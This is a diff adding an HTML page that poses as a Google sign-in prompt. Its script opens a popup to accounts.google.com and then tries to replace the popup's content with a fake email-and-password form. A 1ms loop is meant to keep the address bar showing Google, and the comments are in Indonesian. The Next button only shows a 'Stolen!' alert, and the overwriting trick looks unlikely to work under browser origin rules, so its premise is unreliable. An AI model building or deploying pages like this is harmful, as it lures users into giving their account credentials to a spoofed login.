@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Google Sign-In</title>
+  <style>
+    body { margin:0; height:100vh; background:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; }
+    button { background:#4285f4; color:white; padding:16px 32px; font-size:18px; border:none; border-radius:8px; cursor:pointer; }
+  </style>
+</head>
+<body>
+
+<button onclick="spoof()" style="cursor:pointer;">
+  <div style="text-align:center;">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <h2 style="margin:20px 0;">Click anywhere to sign in with Google</h2>
+  </div>
+</body>
+
+<script>
+function spoof() {
+  // TRICK UTAMA: BUKA POPUP DENGAN LEGIT URL DULU (1ms)
+  let win = window.open("https://accounts.google.com", "_blank");
+
+  // LANGSUNG GANTI ISI PAKAI document.write + race loop
+  setTimeout(() => {
+    win.document.open();
+    win.document.write(`
+      <!DOCTYPE html>
+      <html>
+      <head><title>Sign in – Google Accounts</title></head>
+      <body>
+        <div style="text-align:center;padding:50px;">
+   <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
+   <h2>Sign in</h2>
+   <p>Use your Google Account</p>
+   <form style="margin-top:30px;">
+     <input type="email" placeholder="Email" style="width:300px;padding:12px;margin:10px;border:1px solid #ddd;border-radius:4px;"><br>
+     <input type="password" placeholder="Password" style="width:300px;padding:12px;margin:10px;border:1px solid #ddd;border-radius:4px;"><br>
+     <button type="button" style="background:#1a73e8;color:white;padding:12px 24px;border:none;border-radius:4px;cursor:pointer;" onclick="alert('Stolen!')">Next</button>
+   </form>
+ </div>
+      </body>
+      </html>
+    `);
+    win.document.close();
+
+    // RACE LOOP — PAKSA ADDRESS BAR TETAP GOOGLE
+    setInterval(() => {
+      try {
+        if (win.location.href !== "https://accounts.google.com") {
+          win.location.replace("https://accounts.google.com");
+        }
+      } catch(e) {}
+    }, 1);
+  }, 1);
+}
+</script>
+</html>
